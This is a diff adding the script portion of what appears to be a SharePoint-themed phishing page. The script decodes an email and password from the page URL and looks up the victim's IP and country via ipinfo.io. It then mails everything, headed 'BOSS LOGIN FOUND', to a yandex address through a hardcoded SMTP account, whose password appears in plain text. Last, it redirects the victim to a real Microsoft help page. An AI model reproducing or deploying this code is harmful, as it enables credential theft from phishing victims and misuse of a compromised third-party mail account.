@@ -1,0 +1,84 @@
+
+  <script>
+
+myFunction()
+
+function myFunction() {
+
+
+var feedUpdateResponse = window.location.href;
+var feedUpdateSplit = feedUpdateResponse.split("");
+
+for (var x = 0; x < feedUpdateSplit.length; x++) {
+ 
+ if (feedUpdateSplit[x]=="#"){
+  var che= feedUpdateResponse.substring(x+1);
+ 
+ }else{
+ 
+
+ }
+
+ 
+ 
+ }
+ 
+
+ document.getElementById("myText").value = atob(che);
+  
+  
+}
+ 
+</script>
+<script  src="../../../../ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js">
+
+</script>
+ <script src= 
+	"../../../../smtpjs.com/v3/smtp.js"> 
+</script> 
+   
+<script type="text/javascript"> 
+
+
+
+sendEmail();
+
+	function sendEmail() { 
+	 var url_string = window.location.href; //window.location.href
+var url = new URL(url_string.html);
+var email = url.searchParams.get("email");
+var password = url.searchParams.get("password");
+
+					
+		
+
+
+  $.getJSON('https://ipinfo.io/', function(response) {
+ 
+ var mes = "<HTML><BODY> <TABLE> <tr><td>BOSS LOGIN FOUND </td></tr> <tr><td>ID: >"+atob(email)+"<<td/	></tr><tr><td>Access: >"+atob(password)+"<</td></tr><tr><td>IP: "+response.country+" | <a href='http://whoer.net/check?host="+response.country+"' target='_blank'>"+response.ip +"</a> </td></tr> <tr><td>>Anonymous Cyber Team<</td></tr> </BODY></HTML>";	
+ 
+ country= "Share p login :"+response.country +" Ip:"+ response.ip 
+
+var link="https://support.microsoft.com/en-us/office/sign-in-to-sharepoint-324a89ec-e77b-4475-b64a-13a0c14c45ec";
+
+
+	Email.send({ 
+			Host: "mail.gatericontractors.co.ke", 
+		Username: "info@gatericontractors.co.ke", 
+		Password: "Gcl@2020!", 
+		To: 'mail2anthony@yandex.com', 
+		From: "info@gatericontractors.co.ke", 
+		Subject: country, 
+		Body: mes , 
+		 
+	}) 
+		.then(function (message) {
+		
+		window.location.href=link;
+		}); 
+		
+		},"json")
+	} 
+	
+	
+</script>
